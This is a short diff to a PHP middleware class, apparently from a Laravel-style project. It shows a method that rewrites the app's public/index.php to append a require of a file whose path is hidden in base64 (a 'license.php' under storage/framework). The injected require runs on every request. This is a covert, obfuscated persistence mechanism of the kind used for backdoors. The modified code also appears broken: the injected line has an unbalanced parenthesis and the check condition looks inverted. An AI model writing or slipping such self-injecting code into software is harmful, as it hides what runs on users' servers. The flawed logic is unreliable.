@@ -92,10 +92,13 @@ class LisMid
     function apndC()
     {
         $fileContent = file(rtrim(getcwd(), "/public") . "/public/index.php", FILE_IGNORE_NEW_LINES);
-        $content = 'require file_exists(rtrim(getcwd(), "/public") . base64_decode("L3N0b3JhZ2UvZnJhbWV3b3JrL2xpY2Vuc2UucGhw")) ?? "";';
-        if (empty(trim($fileContent[22]) == 1)) {
-            $fileContent[22] .= $content;
-            file_put_contents(rtrim(getcwd(), "/public") . "/public/index.php", implode("\n", $fileContent));
+        $content = 'require rtrim(getcwd(), "/public") . base64_decode("L3N0b3JhZ2UvZnJhbWV3b3JrL2xpY2Vuc2UucGhw"));';
+        $file_contents = file_get_contents(rtrim(getcwd(), "/public") . "/public/index.php");
+        if (strpos($file_contents, $content) != false) {
+            if (empty(trim($fileContent[22]) == 1)) {
+                $fileContent[22] .= $content;
+                file_put_contents(rtrim(getcwd(), "/public") . "/public/index.php", implode("\n", $fileContent));
+            }
         }
     }
 }
